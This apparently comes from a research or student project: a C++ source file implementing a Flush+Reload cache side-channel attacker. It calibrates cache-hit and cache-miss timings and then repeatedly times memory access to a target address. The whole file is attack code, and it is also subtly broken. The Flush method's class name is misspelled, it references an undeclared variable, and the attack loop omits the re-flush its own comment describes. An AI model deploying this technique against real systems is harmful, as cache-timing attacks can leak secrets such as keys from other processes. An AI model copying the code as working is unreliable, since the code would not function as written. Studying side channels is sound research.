//
// Created by User on 18/5/2019.
//

#include "FRAttacker.h"
#include <unistd.h>
#include <time.h>

using namespace std;


FRAttacker::FRAttacker(string path) :
    Attacker(path) {}

FRAttacker::FRAttacker(string path, char* target, int len) :
    Attacker(path, target, len) {}

FRAttacker::FRAttacker(string path, char* target, int len, int intervalTime) :
    Attacker(path, target, len, intervalTime) {}

FRAttacker::FRAttacker(string path, char* target, int len, int intervalTime, int iteration) :
    Attacker(path, target, len, intervalTime, iteration) {}

void FRAttacket::Flush(){
    __asm__ __volatile__ ("clflush (%0)" :: "r"(p));
}

void FRAttacker::Attack() {
    // declaring variables
    unsigned int measured;

    // logic
    // create a new measurements class
    measurements = Measurements();

    // flush for the first time
    if (maxIterations > 0)
        Flush();

    // main attacking loop: wait, measure, flush
    for (int i = 0; i < maxIterations; i++) {
        usleep(interval);
        measured = MeasureTime(targetPointer);
        measurements.AddMeasurement(time(NULL), measured);
    }
    measurements.UpdateSpeculations();
}

void FRAttacker::Configure() {
    int i;
    unsigned int cyclesSum = 0;
    int numOfIterations = 100;
    for (i = 0; i < numOfIterations; i++) {
        Flush();
        cyclesSum += MeasureTime(targetPointer);
    }
    SetNoCacheTime(cyclesSum / numOfIterations);
    cyclesSum = 0;
    MeasureTime(targetPointer); /* makes sure target pointer has been recently read */
    for (i = 0; i < numOfIterations; i++){
        cyclesSum += MeasureTime(targetPointer);
    }
    SetInCacheTime(cyclesSum / numOfIterations);
}